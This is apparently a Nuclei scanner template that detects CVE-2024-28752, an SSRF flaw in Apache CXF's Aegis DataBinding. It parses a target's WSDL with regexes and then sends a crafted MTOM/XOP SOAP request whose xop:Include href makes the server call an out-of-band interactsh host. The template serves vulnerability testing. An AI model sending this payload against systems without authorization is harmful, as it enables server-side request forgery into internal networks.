id: CVE-2024-28752

info:
  name: Apache CXF AegisDataBinding SSRF via xop:Include
  author: SeungAh-Hong
  severity: high
  description: |
    A SSRF vulnerability using the Aegis DataBinding in versions of Apache CXF before 4.0.4, 3.6.3 and 3.5.8 allows an attacker to perform SSRF style attacks on webservices that take at least one parameter of any type.
    Users of other data bindings (including the default databinding) are not impacted.
  tags: cve, cve-2024-28752, ssrf, soap, xop, cxf, mtom, oast

http:
  # 1) Pull WSDL and extract namespace / operation / wrapper type / first field
  - method: GET
    path:
      - "{{BaseURL}}?wsdl"
    matchers:
      - type: word
        condition: and
        words:
          - "<wsdl:definitions"
          - "targetNamespace="

    # Chained extractors to parse the nested WSDL structure
    extractors:
      - type: regex
        name: tns
        internal: true
        group: 1
        regex:
          - 'targetNamespace="([^"]+)"'
      - type: regex
        name: op
        internal: true
        group: 1
        regex:
          - '<wsdl:operation\s+name="([^"]+)"'
      - type: regex
        name: wrapper
        internal: true
        group: 1
        regex:
          - '<xs:element\s+name="{{op}}"\s+type="tns:([^"]+)"'
      # Extract the first parameter name (e.g., "arg0")
      - type: regex
        name: param_name
        internal: true
        group: 1
        # MODIFIED: Added <xs:sequence> to the path for more precise matching
        regex:
          - '(?s)<xs:complexType\s+name="{{wrapper}}".*?<xs:sequence>.*?<xs:element[^>]*name="([^"]+)"'
      # Extract the type of that parameter (e.g., "model")
      - type: regex
        name: param_type
        internal: true
        group: 1
        # MODIFIED: Added <xs:sequence> to the path for more precise matching
        regex:
          - '(?s)<xs:complexType\s+name="{{wrapper}}".*?<xs:sequence>.*?<xs:element[^>]*type="tns:([^"]+)"'
      # Using the extracted parameter type, find the first field within that type (e.g., "count")
      - type: regex
        name: vuln_field
        internal: true
        group: 1
        # MODIFIED: Added <xs:sequence> to the path for more precise matching
        regex:
          - '(?s)<xs:complexType\s+name="{{param_type}}".*?<xs:sequence>.*?<xs:element[^>]*name="([^"]+)"'

  # 2) MTOM/XOP SOAP with xop:Include injected into the discovered field
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        MIME-Version: 1.0
        Content-Type: multipart/related; boundary="----xopbound"; type="application/xop+xml"; start="<rootpart@cxf>"; start-info="text/xml"

        ------xopbound
        Content-ID: <rootpart@cxf>
        Content-Transfer-Encoding: 8bit
        Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:t="{{tns}}"
                          xmlns:xop="http://www.w3.org/2004/08/xop/include">
          <soapenv:Header/>
          <soapenv:Body>
            <t:{{op}}>
              <{{param_name}}>
                <{{vuln_field}}><xop:Include href="{{oob-url}}"/></{{vuln_field}}>
              </{{param_name}}>
            </t:{{op}}>
          </soapenv:Body>
        </soapenv:Envelope>
        ------xopbound--
    attack: pitchfork
    payloads:
      oob-url:
        - "http://{{interactsh-url}}/{{randstr}}"
        - "https://{{interactsh-url}}/{{randstr}}"
    matchers:
      - type: dsl
        dsl:
          - interactsh_protocol == "dns" || interactsh_protocol == "http"
    stop-at-first-match: true
    max-redirects: 0